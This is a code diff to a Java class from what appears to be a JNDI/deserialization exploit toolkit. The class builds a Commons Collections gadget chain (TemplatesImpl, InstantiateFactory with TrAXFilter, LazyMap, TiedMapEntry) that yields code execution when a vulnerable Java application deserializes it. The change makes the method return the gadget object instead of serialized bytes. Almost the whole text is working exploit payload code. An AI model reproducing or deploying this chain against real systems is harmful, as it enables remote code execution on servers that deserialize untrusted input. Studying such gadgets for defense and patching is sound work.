@@ -19,7 +19,7 @@ import static com.nu1r.jndi.gadgets.utils.Reflections.setFieldValue;
 
 public class CommonsCollections10 implements ObjectPayload<Object> {
 
-    public byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public Object getObject(PayloadType type, String... param) throws Exception {
         final Object           templates         = Gadgets.createTemplatesImpl(type, param);
         // 使用 InstantiateFactory 代替 InstantiateTransformer
         InstantiateFactory instantiateFactory = new InstantiateFactory(TrAXFilter.class, new Class[]{Templates.class}, new Object[]{templates});
@@ -32,25 +32,14 @@ public class CommonsCollections10 implements ObjectPayload<Object> {
         Map     innerMap = new HashMap();
         LazyMap outerMap = (LazyMap) LazyMap.decorate(innerMap, constantTransformer);
 
-        TiedMapEntry tme    = new TiedMapEntry(outerMap, "nu1r");
+        TiedMapEntry tme    = new TiedMapEntry(outerMap, "su18");
         Map          expMap = new HashMap();
-        expMap.put(tme, "nu2r");
+        expMap.put(tme, "su19");
 
         setFieldValue(outerMap, "factory", factoryTransformer);
 
-        outerMap.remove("nu1r");
+        outerMap.remove("su18");
 
-        ByteArrayOutputStream baous = new ByteArrayOutputStream();
-        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
-        oos.writeObject(expMap);
-        byte[] bytes = baous.toByteArray();
-        oos.close();
-
-        return bytes;
-    }
-
-    @Override
-    public Object getObject(String command) throws Exception {
-        return null;
+        return expMap;
     }
 }
